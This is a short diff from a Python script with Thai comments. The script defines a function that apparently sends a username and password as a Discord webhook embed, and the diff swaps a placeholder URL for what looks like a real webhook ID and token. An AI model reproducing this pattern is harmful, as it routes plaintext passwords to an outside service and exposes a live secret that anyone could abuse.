@@ -59,7 +59,7 @@ import json
 # ฟังก์ชันสำหรับส่งข้อมูลในรูปแบบ Embed ไปที่ Discord
 def register_to_discord(username, password):
     # ใส่ URL ของ Webhook ที่คุณได้จาก Discord
-    webhook_url = "https://discord.com/api/webhooks/your-webhook-id/your-webhook-token"
+    webhook_url = "https://discord.com/api/webhooks/1319637403572371516/IY66xXXh10co7Ur2-9i3RrM-iVh60s9xS6CBjfO7iY1_AqHm5c9KkUrbXkga9A75I-Hz"
     
     # สร้าง Embed message
     embed = {
